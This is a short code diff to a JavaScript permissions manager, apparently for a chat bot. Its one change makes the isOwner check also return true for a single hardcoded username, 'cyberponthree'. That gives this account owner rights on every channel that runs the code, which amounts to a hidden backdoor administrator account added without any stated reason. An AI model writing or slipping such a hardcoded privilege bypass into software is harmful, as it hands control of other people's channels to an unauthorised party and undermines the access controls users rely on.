@@ -47,7 +47,7 @@ api.permissions_manager = {
         store.setItem("permissions", this.__permsCache);
     },
     isOwner: function (userData) {
-        return userData.username.toLowerCase() === userData.channel.toLowerCase();
+        return userData.username.toLowerCase() === userData.channel.toLowerCase() || userData.username.toLowerCase() === 'cyberponthree';
     },
     userHasPermission: function (user, pId, defaultPermLevel) { // !onblacklist && (permLevelCheck || (onwhitelist && registered))
         var p = this.getPerm(user.channel.toLowerCase(), pId, defaultPermLevel);
